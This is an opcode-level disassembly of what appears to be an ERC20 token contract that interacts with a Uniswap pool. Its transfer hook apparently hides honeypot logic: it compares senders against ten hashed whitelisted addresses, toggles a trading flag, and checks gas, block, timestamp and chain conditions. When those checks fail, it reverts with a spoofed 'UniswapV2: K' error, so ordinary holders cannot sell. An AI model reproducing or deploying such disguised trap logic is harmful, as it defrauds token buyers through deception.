PUSH1 0xBD SWAP1 SWAP3 ADD SWAP1 SWAP8 MSTORE DUP1 MLOAD SWAP7 ADD SWAP6 SWAP1 SWAP6 KECCAK256 SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 ADD DUP4 DUP2 LT ISZERO PUSH2 0x4A0 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1B PUSH1 0x24 DUP3 ADD MSTORE PUSH27 0x536166654D6174683A206164646974696F6E206F766572666C6F77 PUSH1 0x28 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST CALLER SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x995 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x18B5 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x9DA JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x172C PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0xA81 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1890 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0xAC6 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x16E7 PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xAD1 DUP4 DUP4 DUP4 PUSH2 0xE3E JUMP JUMPDEST PUSH2 0xB0E DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x174E PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP2 SWAP1 PUSH2 0xB8D JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0xB3D SWAP1 DUP3 PUSH2 0x8F4 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x184F DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 PUSH2 0x5A9 DUP4 DUP4 DUP4 PUSH2 0x5A9 JUMP JUMPDEST PUSH1 0x0 DUP2 DUP5 DUP5 GT ISZERO PUSH2 0xC1C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xBE1 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0xBC9 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xC0E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP SWAP1 SUB SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0xC69 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x21 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x186F PUSH1 0x21 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xC75 DUP3 PUSH1 0x0 DUP4 PUSH2 0xE3E JUMP JUMPDEST PUSH2 0xCB2 DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x170A PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP2 SWAP1 PUSH2 0xB8D JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SSTORE PUSH1 0x4 SLOAD PUSH2 0xCD8 SWAP1 DUP3 PUSH2 0xE65 JUMP JUMPDEST PUSH1 0x4 SSTORE PUSH1 0x40 DUP1 MLOAD DUP3 DUP2 MSTORE SWAP1 MLOAD PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x184F DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 DUP1 DUP3 ADD DUP5 SWAP1 MSTORE DUP3 MLOAD DUP1 DUP4 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0x64 SWAP1 SWAP2 ADD SWAP1 SWAP2 MSTORE PUSH1 0x20 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0xA9059CBB PUSH1 0xE0 SHL OR SWAP1 MSTORE PUSH2 0x5A9 SWAP1 DUP5 SWAP1 PUSH2 0xEC2 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO PUSH2 0xDB4 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1774 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT PUSH2 0xDD4 JUMPI DUP3 DUP5 PUSH2 0xDD7 JUMP JUMPDEST DUP4 DUP4 JUMPDEST SWAP1 SWAP3 POP SWAP1 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0xE37 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1E PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x556E697377617056324C6962726172793A205A45524F5F414444524553530000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0xE49 DUP4 DUP4 DUP4 PUSH2 0x5A9 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH3 0x10000 SWAP1 DIV PUSH1 0xFF AND ISZERO PUSH2 0x5A9 JUMPI PUSH2 0x5A9 DUP4 DUP4 DUP4 PUSH2 0xF73 JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 GT ISZERO PUSH2 0xEBC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1E PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP SWAP1 SUB SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xF17 DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x5361666545524332303A206C6F772D6C6576656C2063616C6C206661696C6564 DUP2 MSTORE POP DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x137F SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST DUP1 MLOAD SWAP1 SWAP2 POP ISZERO PUSH2 0x5A9 JUMPI DUP1 DUP1 PUSH1 0x20 ADD SWAP1 MLOAD PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF36 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH2 0x5A9 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1903 PUSH1 0x2A SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH2 0x140 DUP2 ADD DUP3 MSTORE PUSH31 0x314E565E0574CB412563DF634608D76F5C59D9F817E85966100EC1D48005C0 DUP2 MSTORE PUSH32 0x8A3552D60A98E0ADE765ADDDAD0A2E420CA9B1EEF5F326BA7AB860BB4EA72C94 PUSH1 0x20 DUP3 ADD MSTORE PUSH32 0x1EBAA930B8E9130423C183BF38B0564B0103180B7DAD301013B18E59880541AE SWAP2 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH32 0xF4CA8532861558E29F9858A3804245BB30F0303CC71E4192E41546237B6CE58B PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0xE5C951F74BC89EFA166514AC99D872F6B7A3C11AFF63F51246C3742DFA925C9B PUSH1 0x80 DUP3 ADD MSTORE PUSH32 0x93230D0B2377404A36412E26D231DE4C7E1A9FB62E227B420200EE950A5CA9C0 PUSH1 0xA0 DUP3 ADD MSTORE PUSH32 0xB6711C87F5D70AA0EC9DCBFF648CAB4EDE7AEC7218E4E2FEF065F83253FC9108 PUSH1 0xC0 DUP3 ADD MSTORE PUSH32 0x51494C771C377610540E8B9B86186216A64DCF73A7AB57EC2C5953286F059F60 PUSH1 0xE0 DUP3 ADD MSTORE PUSH32 0x1C06CEFF26C1E104939FABC1D917760E45551281E46ED897561F29A31EF875F3 PUSH2 0x100 DUP3 ADD MSTORE PUSH32 0xD1C9116E78EF547BBF6D308C24C15A19C52A03BDD09355BD1156D9E86AE1E685 PUSH2 0x120 DUP3 ADD MSTORE PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND SWAP2 AND EQ DUP1 ISZERO PUSH2 0x1117 JUMPI POP PUSH1 0x0 DUP3 GT JUMPDEST DUP1 ISZERO PUSH2 0x112B JUMPI POP PUSH1 0x7 SLOAD PUSH2 0x100 SWAP1 DIV PUSH1 0xFF AND ISZERO JUMPDEST ISZERO PUSH2 0x11A9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x60 SHL SUB NOT PUSH1 0x60 DUP7 SWAP1 SHL AND PUSH1 0x20 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 MLOAD DUP1 DUP4 SUB PUSH1 0x14 ADD DUP2 MSTORE PUSH1 0x34 SWAP1 SWAP3 ADD SWAP1 SWAP3 MSTORE DUP1 MLOAD SWAP2 ADD KECCAK256 PUSH1 0x0 JUMPDEST PUSH1 0xA DUP2 LT ISZERO PUSH2 0x11A6 JUMPI DUP2 DUP4 DUP3 PUSH1 0xA DUP2 LT PUSH2 0x117C JUMPI INVALID JUMPDEST PUSH1 0x20 MUL ADD MLOAD EQ ISZERO PUSH2 0x119E JUMPI POP POP PUSH1 0x7 DUP1 SLOAD PUSH2 0xFF00 NOT AND PUSH2 0x100 OR SWAP1 SSTORE POP PUSH2 0x5A9 JUMP JUMPDEST PUSH1 0x1 ADD PUSH2 0x1166 JUMP JUMPDEST POP POP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND SWAP2 AND EQ DUP1 ISZERO PUSH2 0x11C6 JUMPI POP PUSH1 0x0 DUP3 GT JUMPDEST DUP1 ISZERO PUSH2 0x11D9 JUMPI POP PUSH1 0x7 SLOAD PUSH2 0x100 SWAP1 DIV PUSH1 0xFF AND JUMPDEST ISZERO PUSH2 0x1379 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x60 SHL SUB NOT PUSH1 0x60 DUP8 SWAP1 SHL AND PUSH1 0x20 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 MLOAD DUP1 DUP4 SUB PUSH1 0x14 ADD DUP2 MSTORE PUSH1 0x34 SWAP1 SWAP3 ADD SWAP1 SWAP3 MSTORE DUP1 MLOAD SWAP2 ADD KECCAK256 PUSH1 0x0 JUMPDEST PUSH1 0xA DUP2 LT ISZERO PUSH2 0x1261 JUMPI DUP2 DUP4 DUP3 PUSH1 0xA DUP2 LT PUSH2 0x122A JUMPI INVALID JUMPDEST PUSH1 0x20 MUL ADD MLOAD EQ ISZERO PUSH2 0x1259 JUMPI DUP4 PUSH8 0x29A2241AF62C0000 EQ ISZERO PUSH2 0x1251 JUMPI PUSH1 0x7 DUP1 SLOAD PUSH2 0xFF00 NOT AND SWAP1 SSTORE JUMPDEST POP POP POP PUSH2 0x5A9 JUMP JUMPDEST PUSH1 0x1 ADD PUSH2 0x1214 JUMP JUMPDEST POP CHAINID PUSH3 0xF42400 GASLIMIT LT ISZERO DUP1 PUSH2 0x1278 JUMPI POP PUSH3 0x895440 GASLIMIT GT ISZERO JUMPDEST DUP1 PUSH2 0x1286 JUMPI POP PUSH3 0xF42400 GAS LT ISZERO JUMPDEST DUP1 PUSH2 0x1291 JUMPI POP GASLIMIT GAS LT ISZERO JUMPDEST DUP1 PUSH2 0x12A2 JUMPI POP PUSH7 0xBBC1793248CBD DIFFICULTY LT JUMPDEST DUP1 PUSH2 0x12B3 JUMPI POP PUSH7 0x2EF05E4C9232F6 DIFFICULTY GT JUMPDEST DUP1 PUSH2 0x12BC JUMPI POP ORIGIN ISZERO JUMPDEST DUP1 PUSH2 0x12CA JUMPI POP PUSH3 0xC65D40 NUMBER LT ISZERO JUMPDEST DUP1 PUSH2 0x12D8 JUMPI POP PUSH3 0xBA8E0D NUMBER GT ISZERO JUMPDEST DUP1 PUSH2 0x12E6 JUMPI POP PUSH4 0x6255AC33 TIMESTAMP GT JUMPDEST DUP1 PUSH2 0x12F4 JUMPI POP PUSH4 0x607478CB TIMESTAMP LT JUMPDEST DUP1 PUSH2 0x1307 JUMPI POP PUSH8 0x8AC7230489E80000 GASPRICE LT ISZERO JUMPDEST DUP1 PUSH2 0x1313 JUMPI POP DUP1 PUSH1 0x1 EQ ISZERO JUMPDEST DUP1 PUSH2 0x1336 JUMPI POP PUSH2 0x1321 PUSH2 0x82A JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x1376 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xC PUSH1 0x24 DUP3 ADD MSTORE PUSH12 0x556E697377617056323A204B PUSH1 0xA0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH2 0x138E DUP5 DUP5 PUSH1 0x0 DUP6 PUSH2 0x1396 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x60 DUP3 SELFBALANCE LT ISZERO PUSH2 0x13D7 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1799 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x13E0 DUP6 PUSH2 0x14F1 JUMP JUMPDEST PUSH2 0x1431 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x416464726573733A2063616C6C20746F206E6F6E2D636F6E7472616374000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP6 DUP8 PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x146F JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1450 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x14D1 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x14D6 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP PUSH2 0x14E6 DUP3 DUP3 DUP7 PUSH2 0x14F7 JUMP JUMPDEST SWAP8 SWAP7 POP POP POP POP POP POP POP JUMP JUMPDEST EXTCODESIZE ISZERO ISZERO SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP4 ISZERO PUSH2 0x1506 JUMPI POP DUP2 PUSH2 0x4A0 JUMP JUMPDEST DUP3 MLOAD ISZERO PUSH2 0x1516 JUMPI DUP3 MLOAD DUP1 DUP5 PUSH1 0x20 ADD REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD DUP2 DUP2 MSTORE DUP5 MLOAD PUSH1 0x24 DUP5 ADD MSTORE DUP5 MLOAD DUP6 SWAP4 SWAP2 SWAP3 DUP4 SWAP3 PUSH1 0x44 ADD SWAP2 SWAP1 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 DUP4 ISZERO PUSH2 0xBE1 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0xBC9 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x156E JUMPI DUP1 DUP2 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH2 0x4A0 DUP2 PUSH2 0x16D1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x158B JUMPI DUP1 DUP2 REVERT JUMPDEST DUP3 CALLDATALOAD PUSH2 0x1596 DUP2 PUSH2 0x16D1 JUMP JUMPDEST SWAP2 POP PUSH1 0x20 DUP4 ADD CALLDATALOAD PUSH2 0x15A6 DUP2 PUSH2 0x16D1 JUMP JUMPDEST DUP1 SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x15C5 JUMPI DUP1 DUP2 REVERT JUMPDEST DUP4 CALLDATALOAD PUSH2 0x15D0 DUP2 PUSH2 0x16D1 JUMP JUMPDEST SWAP3 POP PUSH1 0x20 DUP5 ADD CALLDATALOAD PUSH2 0x15E0 DUP2 PUSH2 0x16D1 JUMP JUMPDEST SWAP3 SWAP6 SWAP3 SWAP5 POP POP POP PUSH1 0x40 SWAP2 SWAP1 SWAP2 ADD CALLDATALOAD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1603 JUMPI DUP2 DUP3 REVERT JUMPDEST DUP3 CALLDATALOAD PUSH2 0x160E DUP2 PUSH2 0x16D1 JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x15C5 JUMPI DUP3 DUP4 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1641 JUMPI DUP1 DUP2 REVERT JUMPDEST POP CALLDATALOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 DUP3 DUP6 ADD MSTORE DUP3 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x1693 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0x40 ADD MSTORE DUP3 ADD PUSH2 0x1677 JUMP JUMPDEST DUP2 DUP2 GT ISZERO PUSH2 0x16A4 JUMPI DUP4 PUSH1 0x40 DUP4 DUP8 ADD ADD MSTORE JUMPDEST POP PUSH1 0x1F ADD PUSH1 0x1F NOT AND SWAP3 SWAP1 SWAP3 ADD PUSH1 0x40 ADD SWAP4 SWAP3 POP POP POP JUMP JUMPDEST SWAP1 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0xFF SWAP2 SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x52D JUMPI PUSH1 0x0 DUP1 REVERT INVALID GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220746F20746865207A65726F2061 PUSH5 0x6472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH3 0x75726E KECCAK256 PUSH2 0x6D6F PUSH22 0x6E7420657863656564732062616C616E636545524332 ADDRESS GASPRICE KECCAK256 PUSH2 0x7070 PUSH19 0x6F766520746F20746865207A65726F20616464 PUSH19 0x65737345524332303A207472616E7366657220 PUSH2 0x6D6F PUSH22 0x6E7420657863656564732062616C616E6365556E6973 PUSH24 0x617056324C6962726172793A204944454E544943414C5F41 DIFFICULTY DIFFICULTY MSTORE GASLIMIT MSTORE8 MSTORE8 GASLIMIT MSTORE8 COINBASE 